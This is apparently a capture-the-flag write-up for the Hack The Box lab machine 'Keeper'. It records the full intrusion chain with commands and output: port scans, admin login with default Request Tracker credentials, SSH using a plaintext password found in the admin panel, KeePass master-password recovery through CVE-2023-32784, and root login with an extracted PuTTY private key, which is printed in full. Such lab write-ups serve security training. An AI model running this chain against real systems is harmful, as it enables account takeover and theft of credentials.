- ping machine
	- `ping ###.###.###.###**,**`
```bash
 kali@kali  ~  ping 10.10.11.227
PING 10.10.11.227 (10.10.11.227) 56(84) bytes of data.
64 bytes from 10.10.11.227: icmp_seq=1 ttl=63 time=57.7 ms
64 bytes from 10.10.11.227: icmp_seq=2 ttl=63 time=56.6 ms
64 bytes from 10.10.11.227: icmp_seq=3 ttl=63 time=53.6 ms
64 bytes from 10.10.11.227: icmp_seq=4 ttl=63 time=54.1 ms
^C
--- 10.10.11.227 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 53.590/55.480/57.659/1.693 msb
```

- nmap for open ports
	- `nmap -p- -T4 --open -Pn -vvv ###.###.###.### -oN nameNmap.txt`
	- document
```bash
 kali@kali  ~  nmap -p- -T4 --open -Pn -vvv 10.10.11.227 -oN keeperNmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 08:20 EST
Initiating SYN Stealth Scan at 08:20
Scanning tickets.keeper.htb (10.10.11.227) [65535 ports]
Discovered open port 80/tcp on 10.10.11.227
Discovered open port 22/tcp on 10.10.11.227
Completed SYN Stealth Scan at 08:20, 17.33s elapsed (65535 total ports)
Nmap scan report for tickets.keeper.htb (10.10.11.227)
Host is up, received user-set (0.11s latency).
Scanned at 2025-01-18 08:20:33 EST for 17s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.44 seconds
           Raw packets sent: 66287 (2.917MB) | Rcvd: 65687 (2.627MB)
```

- nmap for services and versions running on open ports
	- `nmap -p port#, port#, port# -sC -sV ###.###.###.### -oN nameServicesVersionsNmap` 
```bash
 ✘ kali@kali  ~  nmap -p 22,80 -sC -sV 10.10.11.227 -oN keeperNmapServicesVersions.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 08:22 EST
Nmap scan report for tickets.keeper.htb (10.10.11.227)
Host is up (0.069s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds

```

- With http running we navigate to 10.10.11.227 and find a link
- ![[Pasted image 20250118082729.png]]
	- clicking the link we are met with 
	- ![[Pasted image 20250118083057.png]]
	- adding keeper.htb, tickets.keeper.htb to /etc/hosts file
	```bash
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.221    2million.htb edge-eu-free-1.2million.htb
10.10.11.189    precious.htb
10.10.10.84     poison.htb
10.10.11.227    tickets.keeper.htb keeper.htb
```
	- now 10.10.11.227 resolves to tickets.keeper.htb/rt
	- ![[Pasted image 20250118083838.png]]
	- Top right corner RT for tickets.keeper.htb  - Request Tracker 
		- ![[Pasted image 20250118084435.png]]
	- bottom right corner software by Best Practical
		- version for RT 4.4.4 
		- ![[Pasted image 20250118084530.png]]
	- Searching web for `request tracker default credentials ` reveals 
		- root / password default creds
		- Also here, step 7 - https://docs.bestpractical.com/rt/4.2.8/README.html
		- ![[Pasted image 20250118085037.png]]
	- Using root / password to login - we access the admin dashboard
		- ![[Pasted image 20250118085608.png]]
	- Admin --> Users 
	- sf
	- lnorgaard / New user. Initial password set to Welcome2023!
	- ssh'ing into lnorgaard with Welcome2023!
	- catting user.txt `5c201f63e112df52c4da45a369c867b9`
	- In home directory is RT30000.zip
		- unzipping produces KeePassDumpFull.dmp and passcodes.kdbx
		- With these 2 files we can take advantage of CVE-2023-32784
	- I scp'd the files down from the machine we're attacking to my kali
		- `$ scp lnorgaard@10.10.11.227:/home/lnorgaard/KeePassDumpFull.dmp KeePassDumpFull.dmp`
		- `$ scp lnorgaard@10.10.11.227:/home/lnorgaard/passcodes.kdbx passcodes.kdbx`
	- Then we need to run poc on KeePassDumpFull.dmp to generate the master password 
		- [KeePass dump masterkey](https://github.com/matro7sh/keepass-dump-masterkey)
		- from the output the master password appears to end in med flode
		- google search reveals a Danish red berry pudding with the name rodgod med flode 
		```bash
kali@kali  ~/htb/keeper  python3 poc.py -d KeePassDumpFull.dmp
2025-01-24 05:39:40,212 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de		
```
	- Installing keepassxc and opening 
		- using password `rødgrød med fløde` 
		- under network tab on right
			- keeper.htb with root as user
			- under general tab is a putty-user-key-file
			- ![[Pasted image 20250124065056.png]]
	- saving the putty-user-key-file to a file called keeperRootPuttyKeyFile.txt
```bash
PuTTY-User-Key-File-3: ssh-rsa 
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0`
```
- Create open ssh key with puttygen
```bash
kali@kali  ~/htb/keeper  puttygen keeperRootPuttyKeyFile.txt -O private-openssh -o id_rsa_keeper
```
- login to root with ssh key
```bash
 kali@kali  ~/htb/keeper  ssh root@10.10.11.227 -i id_rsa_keeper                                        
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64) 
```
- home directory has the root.txt flag
```bash
root@keeper:~# ll                                                       
total 85384                                                             
drwx------  5 root root     4096 Jan 20 17:37 ./                        
drwxr-xr-x 18 root root     4096 Jul 27  2023 ../                       
lrwxrwxrwx  1 root root        9 May 24  2023 .bash_history -> /dev/null                                  
-rw-r--r--  1 root root     3106 Dec  5  2019 .bashrc                                                     
drwx------  2 root root     4096 May 24  2023 .cache/                                                     
-rw-------  1 root root       20 Jul 27  2023 .lesshst                                                    
lrwxrwxrwx  1 root root        9 May 24  2023 .mysql_history -> /dev/null                                 
-rw-r--r--  1 root root      161 Dec  5  2019 .profile                                                    
-rw-r-----  1 root root       33 Jan 20 17:37 root.txt                                                    
-rw-r--r--  1 root root 87391651 Jul 25  2023 RT30000.zip                                                 
drwxr-xr-x  2 root root     4096 Jul 25  2023 SQL/                                                        
drwxr-xr-x  2 root root     4096 May 24  2023 .ssh/                                                       
-rw-r--r--  1 root root       39 Jul 20  2023 .vimrc                                                      
root@keeper:~# whoami                                                                                     
root                                                                                                      
root@keeper:~# cat root.txt                                                                               
6430171cabc2e4f3ca55d20c8e8f364f
```


















